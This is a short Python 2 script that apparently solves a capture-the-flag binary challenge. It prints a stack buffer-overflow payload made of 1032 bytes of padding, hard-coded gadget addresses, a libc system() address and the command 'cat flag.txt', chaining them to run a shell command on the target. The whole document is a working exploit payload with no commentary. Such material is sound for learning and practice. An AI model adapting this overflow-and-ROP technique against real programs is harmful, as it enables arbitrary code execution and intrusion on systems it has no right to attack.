import struct

#sys=0x7fffffffda30 
sys= 0x7ffff7a56800
 
g1=0x4006d1
g2=0x4006d3
g3=0x4006d0
payload = "A" * 1032 + struct.pack('<Q',g1) +struct.pack('<Q',0x18)+struct.pack('<Q',g2) +'cat flag.txt'+'\x00'*12+ struct.pack('<Q',g3) + struct.pack('<Q',sys)

print payload
